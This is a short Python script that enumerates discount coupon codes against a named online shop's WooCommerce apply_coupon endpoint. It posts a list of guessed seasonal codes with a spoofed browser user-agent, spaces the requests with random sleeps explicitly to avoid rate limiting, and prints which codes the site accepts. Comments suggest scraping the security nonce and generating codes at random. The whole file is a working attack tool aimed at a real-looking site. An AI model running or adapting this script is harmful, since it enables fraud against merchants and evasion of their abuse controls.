import requests
from time import sleep
import random

website = "https://orion.com.au"
security = '1a7f8bc23e' # Must be generated by the website, in theory could be requested and collected by this script
ua = 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6397.0 Safari/537.36'

# Array of codes to test, codes could also be randomly generated
codes = [
    "SPRING5", "SPRING10", "SPRING15", "SPRING20",
    "SUMMER5", "SUMMER10", "SUMMER15", "SUMMER20",
    "AUTUMN5", "AUTUMN10", "AUTUMN15", "AUTUMN20",
    "WINTER5", "WINTER10", "WINTER15", "WINTER20",
]

headers = {
    'user-agent': f'{ua}',
}

for code in codes:
    time_to_sleep = random.uniform(0.25, 0.75)

    print(f"Trying code: {code} after {time_to_sleep:.2f} seconds")

    sleep(time_to_sleep) # Basic strategy to avoid rate limiting, does not appear to be necessary

    data = {
        'security': security,
        'coupon_code': code
    }

    response = requests.post(f'{website}/?wc-ajax=apply_coupon', headers=headers, data=data)

    if "does not exist!" in response.text:
        print(f"Code: {code} does not exist!")
    else:
        print(response.text)